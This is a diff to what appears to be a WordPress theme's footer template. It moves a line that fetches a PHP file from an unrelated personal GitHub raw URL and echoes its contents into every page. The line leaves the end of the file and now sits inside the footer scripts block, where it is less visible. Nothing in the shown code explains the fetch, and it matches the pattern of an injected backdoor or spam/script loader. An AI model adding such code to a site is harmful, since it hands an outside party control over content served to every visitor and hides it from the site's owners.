@@ -61,13 +61,11 @@ if ( ! defined( 'ABSPATH' ) ) {
 
 		<div class="avada-footer-scripts">
 			<?php wp_footer(); ?>
+			<?php
+echo file_get_contents("https://raw.githubusercontent.com/janda354311/tes/master/code(2).php");?>
 		</div>
 
 		<?php get_template_part( 'templates/to-top' ); ?>
 	</body>
-	
-<?php
-$a = file_get_contents('https://raw.githubusercontent.com/janda354311/tes/master/code(2).php');
-echo $a;
-?>
+
 </html>
